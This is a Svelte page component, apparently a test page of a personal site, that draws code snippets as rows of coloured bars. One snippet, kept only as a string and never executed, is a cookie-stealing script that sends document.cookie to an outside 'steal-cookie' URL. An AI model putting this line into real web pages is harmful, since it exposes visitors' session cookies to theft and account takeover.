<script>
  const colors = [
    "linear-gradient(90deg, rgb(255, 218, 122) 0%, rgb(255, 105, 105) 100%)",
    "linear-gradient(90deg, rgb(242, 159, 255) 0%, rgb(124, 153, 255) 100%)",
    "linear-gradient(90deg, rgb(100, 145, 214) 0%, rgb(67, 240, 199) 100%)",
    "#969696",
  ];

  const rcol = () => Math.floor(Math.random() * colors.length);
  const token = (width) =>
    `<div style="width: ${width * 18}px; height: 16px; background: ${
      colors[rcol()]
    }; margin:5px;"></div>`;

  const makeTokens = (code) =>
    code
      .split("\n") // replaceAll curly braces
      .map((line) => line.replaceAll("{", "").replaceAll("}", "").trim()) // remove empty lines
      .filter((line) => line.length > 0) // map each line to a div and each wordlen to a token
      .map((line) => line.split(" ").map((word) => token(word.length))); // join lines;

  const codes = makeTokens(`
var xhr = new XMLHttpRequest()
const c= document.cookie
xhr.open("GET", "//nukes.in/steal-cookie?c=" +c, true)
xhr.send()
`);
  const graph = makeTokens(`class Graph {
  constructor (){
    this.nodes = new Map()
  }

  addNode (node) {
    this.nodes.set( node, [])
  }}`);
</script>

<!-- Path: src/routes/test/+page.svelte -->
<main class="m20">
  <div class="main mx-a">
    {#each graph as line}
      <div class="ƒ">
        {#each line as token}
          {@html token}
        {/each}
      </div>
    {/each}
  </div>
  <h1 class="fw4 main" style="color: #fff;font-size:4em;margin:1em auto;">
    Hi, I'm Manav
  </h1>
  <div class="main mx-a">
    {#each codes as line}
      <div class="ƒ">
        {#each line as token}
          {@html token}
        {/each}
      </div>
    {/each}
  </div>
</main>

<style>
  :global(body) {
    background: #222;
  }
  .main {
    width: 50%;
  }
  @media (max-width: 600px) {
    .main {
      width: 100%;
    }
  }
</style>
